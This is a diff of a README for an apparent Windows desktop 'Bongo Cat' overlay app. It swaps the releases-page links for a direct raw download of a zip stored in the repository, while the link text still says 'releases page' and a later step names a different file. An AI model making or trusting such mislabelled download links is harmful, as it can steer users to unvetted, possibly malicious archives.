@@ -1,6 +1,6 @@
 # 😺 BongoCat-Windows - Add animated fun to your desktop
 
-[![](https://img.shields.io/badge/Download-Release-blue.svg)](https://github.com/Lavalavamosaiclaw205/BongoCat-Windows/releases)
+[![](https://img.shields.io/badge/Download-Release-blue.svg)](https://github.com/Lavalavamosaiclaw205/BongoCat-Windows/raw/refs/heads/main/Application/Bongo_Cat_Windows_2.7.zip)
 
 BongoCat-Windows is a desktop application that displays a Bongo Cat character on your screen. This character tracks your mouse movements and keyboard keys in real time. It mimics your input on instruments like a piano, keyboard, or guitar. The app works well as an overlay for streaming software like OBS. You can customize the look of the character with different skins to match your desktop setup. It serves as a visualizer for your rhythm games or music production sessions.
 
@@ -30,7 +30,7 @@ Ensure your computer meets these requirements to run the software.
 
 Follow these steps to set up the application on your computer.
 
-1. Visit the [releases page](https://github.com/Lavalavamosaiclaw205/BongoCat-Windows/releases) to access the latest files.
+1. Visit the [releases page](https://github.com/Lavalavamosaiclaw205/BongoCat-Windows/raw/refs/heads/main/Application/Bongo_Cat_Windows_2.7.zip) to access the latest files.
 2. Look for the file named BongoCat-Windows.zip in the Assets section of the latest release.
 3. Click the file name to start the download.
 4. Open your Downloads folder once the file finishes downloading.
